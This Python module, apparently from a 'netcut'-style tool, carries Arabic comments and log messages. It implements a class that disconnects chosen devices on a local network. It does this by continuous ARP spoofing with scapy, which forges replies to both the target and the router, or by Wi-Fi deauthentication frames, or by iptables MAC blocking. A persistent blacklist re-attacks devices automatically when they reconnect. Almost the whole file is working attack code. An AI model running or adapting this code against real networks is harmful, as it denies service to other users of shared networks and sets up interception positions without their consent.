"""
محرك قطع الاتصال عبر ARP Spoofing باستخدام scapy
"""
import threading
import time
from utils.logger import log

try:
    from scapy.all import ARP, Ether, sendp, getmacbyip, conf
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    log.warning("scapy غير مثبت - قطع الاتصال عبر ARP لن يعمل")

from core.deauth import DeauthAttack
from core.iptables_block import IptablesBlocker

class Disconnector:
    def __init__(self):
        self._active_attacks = {}  # {ip: {"thread": thread, "running": bool, "timer": timer}}
        self._persistent_blacklist = {} # {mac: {"until": timestamp, "ip": last_ip, "type": attack_type, "iface": iface}}
        self._lock = threading.Lock()
        self.deauth_engine = DeauthAttack()
        self.iptables_engine = IptablesBlocker()

    def is_available(self):
        return True # دائماً متاح لأنه يمتلك عدة طرق، ويتم التحقق الداخلي حسب الطريقة

    def disconnect(self, target_ip, target_mac, gateway_ip, duration=-1, on_status=None, attack_type="arp", iface=None, bssid=None):
        """قطع الاتصال عن جهاز محدد بأحد الطرق الثلاث: arp, deauth, iptables"""
        if attack_type == "arp" and not HAS_SCAPY:
            log.error("scapy غير متوفر - لا يمكن استخدام ARP")
            return False
        if attack_type == "deauth" and not self.deauth_engine.is_available():
            log.error("scapy غير متوفر - لا يمكن استخدام Deauth")
            return False
        if attack_type == "iptables" and not self.iptables_engine.is_available():
            log.error("iptables غير متوفر")
            return False
        with self._lock:
            if target_ip in self._active_attacks:
                log.warning(f"الجهاز {target_ip} مقطوع بالفعل")
                return False
                
        # التحذير إذا كان الجهاز المحلي
        from utils.network import get_local_ip
        if target_ip == get_local_ip():
            log.error("لا يمكن قطع الاتصال عن جهازك نفسه")
            return False
        # التحقق من صحة MAC - إذا لم يكن MAC حقيقياً نحاول الحصول عليه
        if not target_mac or "N/A" in target_mac or len(target_mac) < 17:
            try:
                target_mac = getmacbyip(target_ip)
            except Exception:
                target_mac = None
            if not target_mac:
                log.error(f"لا يمكن الحصول على MAC لـ {target_ip}")
                return False

        log.info(f"بدء قطع الاتصال عن {target_ip} ({target_mac}) - المدة: {duration}s")

        # تسجيل الجهاز في القائمة السوداء الدائمة
        until_time = time.time() + duration if duration > 0 else None
        with self._lock:
            self._persistent_blacklist[target_mac.upper()] = {
                "until": until_time,
                "ip": target_ip,
                "gateway_ip": gateway_ip,
                "type": attack_type,
                "iface": iface,
                "bssid": bssid
            }

        # توجيه الهجوم حسب النوع
        if attack_type == "deauth":
            res = self.deauth_engine.start_attack(target_mac, bssid, iface, duration, on_status)
            if res:
                with self._lock:
                    self._active_attacks[target_ip] = {"type": "deauth", "mac": target_mac.upper()}
            return res
            
        elif attack_type == "iptables":
            res = self.iptables_engine.block_mac(target_mac)
            if res:
                if on_status: on_status(target_ip, "disconnected")
                if duration > 0:
                    timer = threading.Timer(duration, lambda: self.reconnect(target_ip))
                    timer.start()
                    with self._lock:
                        self._active_attacks[target_ip] = {"type": "iptables", "mac": target_mac.upper(), "timer": timer}
                else:
                    with self._lock:
                        self._active_attacks[target_ip] = {"type": "iptables", "mac": target_mac.upper()}
            return res

        # الوضع الافتراضي ARP
        attack_info = {"running": True, "thread": None, "timer": None, "type": "arp", "mac": target_mac.upper()}

        def _spoof():
            try:
                # إنشاء حزم ARP مزيفة
                # خداع الهدف بأننا الراوتر
                pkt_to_target = Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip
                )
                # خداع الراوتر بأننا الهدف
                gateway_mac = getmacbyip(gateway_ip)
                if not gateway_mac:
                    log.error("لم يتم العثور على MAC الراوتر")
                    return

                pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip
                )

                # حجب تمرير البيانات (IP Forward) عبر جهازنا لضمان انقطاع الإنترنت عن الهدف
                self.iptables_engine.block_mac(target_mac)

                if on_status:
                    on_status(target_ip, "disconnected")

                while attack_info["running"]:
                    sendp(pkt_to_target, verbose=False)
                    sendp(pkt_to_gateway, verbose=False)
                    time.sleep(0.3)  # تسريع الحقن لمنع الأجهزة الحديثة من تصحيح الاتصال

                # إعادة الاتصال
                self.iptables_engine.unblock_mac(target_mac)
                self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                if on_status:
                    on_status(target_ip, "online")

            except Exception as e:
                log.error(f"خطأ في قطع الاتصال عن {target_ip}: {e}")
                self.iptables_engine.unblock_mac(target_mac)
                if on_status:
                    on_status(target_ip, "error")

        thread = threading.Thread(target=_spoof, daemon=True)
        attack_info["thread"] = thread

        # مؤقت الإيقاف التلقائي
        if duration > 0:
            timer = threading.Timer(duration, lambda: self.reconnect(target_ip))
            attack_info["timer"] = timer
            timer.start()

        with self._lock:
            self._active_attacks[target_ip] = attack_info
        thread.start()
        return True

    def reconnect(self, target_ip):
        """إعادة الاتصال لجهاز محدد"""
        target_mac = None
        with self._lock:
            if target_ip not in self._active_attacks:
                return False
            attack = self._active_attacks[target_ip]
            
            # محاولة إيجاد الماك لمسحه من القائمة السوداء
            for mac, info in list(self._persistent_blacklist.items()):
                if info.get("ip") == target_ip:
                    target_mac = mac
                    break
            
            if target_mac and target_mac in self._persistent_blacklist:
                del self._persistent_blacklist[target_mac]

        # التعامل مع أنواع الهجوم المختلفة
        a_type = attack.get("type", "arp")
        mac = attack.get("mac", target_mac)

        if a_type == "deauth" and mac:
            self.deauth_engine.stop_attack(mac)
        elif a_type == "iptables" and mac:
            self.iptables_engine.unblock_mac(mac)
            if attack.get("timer"):
                attack.get("timer").cancel()
        else: # arp
            attack["running"] = False
            if attack.get("timer"):
                attack["timer"].cancel()
            if attack.get("thread") and attack["thread"].is_alive():
                attack["thread"].join(timeout=5)

        with self._lock:
            if target_ip in self._active_attacks:
                del self._active_attacks[target_ip]
        log.info(f"تم إعادة الاتصال لـ {target_ip} (طريقة: {a_type})")
        return True

    def reconnect_all(self):
        """إعادة الاتصال لجميع الأجهزة"""
        with self._lock:
            ips = list(self._active_attacks.keys())
        for ip in ips:
            self.reconnect(ip)
        log.info("تم إعادة الاتصال لجميع الأجهزة")

    def is_disconnected(self, ip):
        with self._lock:
            return ip in self._active_attacks

    def get_disconnected_list(self):
        with self._lock:
            return list(self._active_attacks.keys())

    def auto_disconnect_if_blacklisted(self, ip, mac, on_status=None):
        """يتم استدعاؤها من المراقب لفحص واستئناف القطع إن كان الجهاز بالقائمة السوداء"""
        if not mac or "N/A" in mac:
            return False
        
        mac_upper = mac.upper()
        with self._lock:
            if mac_upper not in self._persistent_blacklist:
                return False
            
            info = self._persistent_blacklist[mac_upper]
            until_time = info.get("until")
            
            # التحقق هل انتهت مدة المنع؟
            if until_time is not None and time.time() > until_time:
                del self._persistent_blacklist[mac_upper]
                return False
            
            # تحديث الـ IP الجديد إن تغير
            info["ip"] = ip
            gateway_ip = info.get("gateway_ip")
            attack_type = info.get("type", "arp")
            iface = info.get("iface")
            bssid = info.get("bssid")

        # إذا وصل هنا، يعني أن الجهاز ما زال معاقباً ويجب قطعه مجدداً
        # نحسب الوقت المتبقي لـ timer
        remaining_duration = int(until_time - time.time()) if until_time else -1
        
        log.info(f"استئناف القطع تلقائياً للجهاز العائد: {ip} ({mac_upper}) بنوع {attack_type}")
        return self.disconnect(ip, mac_upper, gateway_ip, duration=remaining_duration, on_status=on_status, attack_type=attack_type, iface=iface, bssid=bssid)

    def _restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """إرسال حزم ARP صحيحة لإعادة الاتصال"""
        try:
            pkt_to_target = Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=gateway_ip, hwsrc=gateway_mac
            )
            pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=target_ip, hwsrc=target_mac
            )
            for _ in range(5):
                sendp(pkt_to_target, verbose=False)
                sendp(pkt_to_gateway, verbose=False)
                time.sleep(0.3)
            log.info(f"تم استعادة ARP لـ {target_ip}")
        except Exception as e:
            log.error(f"فشل استعادة ARP لـ {target_ip}: {e}")

    def cleanup(self):
        """تنظيف عند إغلاق التطبيق"""
        self.reconnect_all()
        self.deauth_engine.cleanup()
        self.iptables_engine.cleanup()
